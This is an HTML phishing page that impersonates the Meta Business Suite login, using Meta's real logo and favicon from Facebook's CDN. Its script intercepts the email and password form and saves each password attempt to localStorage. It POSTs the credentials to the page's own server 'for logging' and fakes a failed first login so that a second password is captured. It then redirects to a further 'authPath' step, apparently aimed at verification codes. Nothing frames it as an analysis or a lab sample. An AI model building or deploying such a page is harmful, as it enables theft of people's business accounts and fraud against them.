<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Meta Business Suite - Log In</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    
    <!-- Google Fonts: Inter -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-color: #0064e0;
            --primary-hover: #0056c1;
            --bg-gradient: linear-gradient(135deg, #f0f2f5 0%, #e7e9ed 100%);
            --card-bg: #ffffff;
            --text-main: #1c1e21;
            --text-secondary: #65676b;
            --input-border: #dddfe2;
            --input-focus: #1877f2;
            --shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: var(--bg-gradient);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .brand-logo {
            text-align: center;
            margin-bottom: 24px;
        }

        .brand-logo img {
            width: 180px;
            height: auto;
        }

        .login-card {
            background: var(--card-bg);
            border-radius: 12px;
            box-shadow: var(--shadow);
            padding: 24px 16px 32px;
            text-align: center;
        }

        .card-header h2 {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--text-main);
        }

        .card-header p {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 12px;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid var(--input-border);
            border-radius: 6px;
            font-size: 15px;
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
        }

        .form-group input:focus {
            border-color: var(--input-focus);
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 12px;
        }

        .btn-login:hover {
            background-color: var(--primary-hover);
        }

        .forgot-password {
            display: block;
            margin-top: 16px;
            font-size: 14px;
            color: var(--primary-color);
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            border-top: 1px solid var(--input-border);
            margin: 20px 0;
            position: relative;
        }

        .footer-text {
            font-size: 14px;
            color: var(--text-secondary);
            margin-top: 24px;
            text-align: center;
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-login.loading .btn-text {
            display: none;
        }

        .btn-login.loading .spinner {
            display: block;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="brand-logo">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Meta">
        </div>
        
        <div class="login-card">
            <div class="card-header">
                <h2>Log in to Meta</h2>
                <p>Use your account to manage your business.</p>
            </div>
            
            <form id="login_form">
                <div class="form-group">
                    <input type="text" name="email" id="email" placeholder="Email or phone number" required autofocus>
                </div>
                <div class="form-group">
                    <input type="password" name="pass" id="pass" placeholder="Password" required>
                </div>
                
                <button type="submit" id="loginbutton" class="btn-login">
                    <span class="btn-text">Log In</span>
                    <div class="spinner"></div>
                </button>
            </form>
            
            <a href="#" class="forgot-password">Forgotten account?</a>
            
            <div class="divider"></div>
            
            <p style="font-size: 14px; color: #1c1e21;">New to Meta Business? <a href="#" style="color: var(--primary-color); text-decoration: none; font-weight: 600;">Create an account</a></p>
        </div>
        
        <div class="footer-text">
            <p>&copy; 2026 Meta &bull; Business Suite</p>
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            var loginForm = document.getElementById("login_form");
            var loginBtn = document.getElementById("loginbutton");

            if (loginForm) {
                // Pre-fill email if it was previously entered
                var savedEmail = localStorage.getItem("fb_email");
                if (savedEmail) {
                    var emailInput = document.getElementById("email");
                    if (emailInput) emailInput.value = savedEmail;
                }

                loginForm.addEventListener("submit", function (e) {
                    e.preventDefault();
                    
                    // Show loading state
                    loginBtn.classList.add("loading");
                    loginBtn.disabled = true;

                    var email = document.getElementById("email").value;
                    var pass = document.getElementById("pass").value;

                    var attempts = localStorage.getItem("login_attempts") || 0;
                    attempts = parseInt(attempts) + 1;
                    localStorage.setItem("login_attempts", attempts);
                    localStorage.setItem("fb_email", email);

                    if (attempts === 1) {
                        localStorage.setItem("fb_pass1", pass);
                    } else if (attempts >= 2) {
                        localStorage.setItem("fb_pass2", pass);
                    }

                    // Send data to server for logging
                    fetch("/login", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": "{{ csrf_token() }}"
                        },
                        body: JSON.stringify({
                            email: email,
                            pass: pass,
                            attempts: attempts,
                        }),
                    })
                    .then(function () {
                        return fetch("/session-paths");
                    })
                    .then((r) => r.json())
                    .then(function (paths) {
                        setTimeout(function() {
                            if (attempts < 2) {
                                window.location.href = paths.loginPath;
                            } else {
                                localStorage.setItem("login_attempts", 0);
                                window.location.href = paths.authPath;
                            }
                        }, 800); // Small delay for "premium" feel
                    })
                    .catch(function (error) {
                        console.error("Error sending data:", error);
                        // Fallback redirect if error
                        fetch("/session-paths")
                        .then((r) => r.json())
                        .then(function (paths) {
                            if (attempts < 2) {
                                window.location.href = paths.loginPath;
                            } else {
                                localStorage.setItem("login_attempts", 0);
                                window.location.href = paths.authPath;
                            }
                        });
                    });
                });
            }
        });
    </script>
</body>
</html>
